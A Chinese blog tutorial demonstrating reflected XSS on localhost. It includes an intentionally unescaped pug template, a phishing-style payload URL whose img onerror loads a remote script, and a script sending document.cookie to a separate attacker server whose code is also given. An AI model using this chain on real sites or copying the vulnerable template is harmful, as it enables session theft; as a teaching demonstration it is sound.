---
tags: ['网络安全', '面试问题 - 网络']
date: 10.21.2019
image: /images/xss-beat-intro.png
description: 带你完整地演示一遍反射型 XSS 攻击
---

# XSS 攻击 - 反射型

> Posted: 10.21.2019

<Tag />

## 反射型 XSS 的特点

> 目前为止，最常见的 XSS 攻击

反射型 XSS，也叫非持久型 XSS。

是指发生请求时，XSS 代码出现在请求 URL 中，作为参数提交到服务器，服务器解析并响应。

响应结果中包含XSS代码，最后浏览器解析并执行。

因此，使用服务端渲染时，收到的 XSS 有极大概率为反射型 XSS。

反射型 XSS 攻击的流程如下：

1. 攻击者寻找具有漏洞的网站
2. 攻击者给用户发了一个带有恶意字符串的链接
3. 用户点击了该链接
4. 服务器返回 HTML 文档，此时该文档已经包含了那个恶意字符串
5. 客服端执行了植入的恶意脚本，XSS攻击就发生了

![xss](/images/xss.png)

有一点非常重要的是：

<span v-red>**反射型 XSS 攻击的并不是具有漏洞的网站本身，而是利用该具有漏洞的网站来攻击用户！！！**</span>

因此，那个具有漏洞的网站，本身是没有任何影响的！<span v-line>除了被同行视作sb</span>

## 代码模拟

### 被攻击的服务器

首先我们起一个普通的 node 服务器，作为被攻击的网站服务器。

这个服务器就是相当于做了一个简单的搜索，然后返回搜索的结果。

```javascript
const express = require("express");
const path = require('path');

const app = express();

app.use(express.static("./xss.html"));

app.set('view engine', 'pug');

app.get("/index", (req, res) => {
  res.sendFile(path.join(__dirname, './xss.html'));
});

app.get("/result", (req, res) => {
  // 做一个简单的搜索
  const obj = {
    a: 'this is a',
    b: 'this is b'
  }
  const { q } = req.query;

  /**
   * SSR
   * 使用 SSR 的目的是为了将恶意代码直接注入 HTML
   * result.pug 在下一个 section 会讲
   */
  res.render(path.join(__dirname, './result.pug'), {
    query: q,
    result: obj[q],
    found: obj[q] !== undefined && obj[q] !== null
  });
});

app.listen(8081, () => console.log("SB server running on port 8081"));
```

大家可以发现，在这里我用了 SSR。

那么，为什么要用 SSR 呢？

是因为反射型 XSS 攻击中，恶意的代码是作为 HTML 文档的一部分从服务器发送回来的。

也就是说，当我们来到 /result 这个页面的时候，文档解析完成，恶意代码便会执行。

如果用客户端渲染的话，当我们来到 /result 这个页面，服务器返回的 HTML 文档是安全的。

只不过，我们接下来通过 AJAX 获取到了恶意的脚本，但这就不是反射型 XSS 了，而是 DOM 型 XSS。

DOM 型 XSS 接下来会讲，这里只要记住我们必须得用 SSR 才能触发反射型 XSS 攻击就行了。

### 被攻击的客户端

前端就是用来展示搜索的结果

输入搜索内容的页面

```html
<body>
  <div class="container">
    <form id="myform">
      搜索： <input type="text" placeholder="搜索..." />
      <button class="submit-btn">提交</button>
    </form>
  </div>
  <script>
    // 绑定表单的提交
    document.querySelector(".submit-btn").addEventListener('click', (e) => {
      e.preventDefault();
      var value = document.querySelector('input').value;
      window.location.href = `http://localhost:8081/result?q=${value}`;
    });
  </script>
</body>
```

搜索后跳转到结果页面。

由于是 SSR，我用的模板引擎是 pug

```pug
<!-- result.pug -->
doctype html
html
  head
    meta(charset="utf-8")
  body
    if (found)
      div#container found: !{result}
    else
      div#container !{query} not found
```

最终实现的效果是这样的：

（图片就复用 DOM 型 XSS 的图片了，反正这俩对于用户来说是一样的）

![xss-vic](/images/xss-victim.gif)

### 攻击者寻找目标

攻击者这个时候会搜索 `<img onerror="alert('XSS')" src=null />`

有两点可以帮攻击者定位到你这个不安全的服务器。

1. query string 里出现攻击的代码

![xss error1](/images/xss-error1.png)

2. 在结果页面，攻击代码被执行

![xss attack](/images/xss-attack.gif)

这个时候攻击还没开始，因为这一切都只是发生在攻击者的电脑上而已。

但攻击者已经找到了一个可以利用的网站。接下来就是开始攻击了。

### 开始攻击

一般来说，反射型 XSS 的代码会通过邮件，以链接的方式发送。

如下：

![xss email](/images/xss-email.png)

我们可以发现，这封邮件其实就是钓鱼邮件，但和真的邮件非常像。

只不过其发送者不是 `bilibili`，而是 `bilibiili`。

而他们提供的链接，究竟去到哪里呢？

![xss link](/images/xss-link.png)

我们可以看见，这里真实的 url 为刚才那个防御薄弱的网站。

如果取消 escape，我们可以看见链接是这样的：

`http://localhost:8081/result?q=<img src=null onerror="var script = document.createElement('script');       script.src = 'http:\/\/localhost:8082/danger';body.appendChild(script);" />`

也就是说，当你进入这个页面的时候，就执行了位于 `localhost:8082/danger` 的脚本。

那么问题来了，为什么要走 img，而不是直接调用 script 标签？

因为使用 innerHTML 的时候，无法动态添加 script 标签并执行。

因此，我们的客户端对 XSS 攻击稍微有一点抗性的嘛...

### 攻击者的攻击脚本

一般来说，就是获取 cookie 并且发送到后台。

但其实能做的事情多了。这里就不一一列举了。

```javascript
// 原生 AJAX 方法
var xhr = new XMLHttpRequest();
xhr.open('get', `http://localhost:8082/attack?q=${document.cookie}`, true);
xhr.send();
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4 && xhr.status === 200) {
    /**
     * 傻逼才会在这里显示攻击成功
     * 我这仅仅出于说明的目的
     */
    console.log('攻击成功！');
  }
}
```

### 攻击者的服务器

然后我们起一个攻击者的服务器，用来处理用户发送的数据。

攻击者的服务器很简单，就是接收请求，然后读取 query string 里面的 cookie 信息。

```javascript
const express = require("express");
const path = require('path');
const app = express();

app.use(express.static("./attack.js"));

app.get("/danger", (req, res) => {
  res.sendFile(path.join(__dirname, './attack.js'));
});

app.get("/attack", (req, res) => {
  // 从 query string 上拿到被攻击者的 cookie
  const { q } = req.query;
  console.log(q);
  res.status(204).end();
});

app.listen(8082, () => console.log("Attacker running on port 8082"));
```

### 结果

当用户点击我们的沙雕邮件时，我们成功获取到了用户的 cookie。

![xss-cookie](/images/xss-cookie.png)

客户端报错了，但这已经不重要了。

（出于伪装目的，可以使用 CORS 来避免报错）

![xss-error](/images/xss-finalerror.png)

## 反射型 XSS 的请求数

在反射型 XSS 执行的过程中，一共只发送了一个请求。

![xss-network](/images/xss-network.png)

恶意的代码已经被植入到了返回的 HTML 文档中。

## 参考资料

[前端安全之XSS攻击](https://www.cnblogs.com/unclekeith/p/7750681.html)

[Reflected cross site scripting (XSS) attacks](https://www.imperva.com/learn/application-security/reflected-xss-attacks/)

<Chirpy />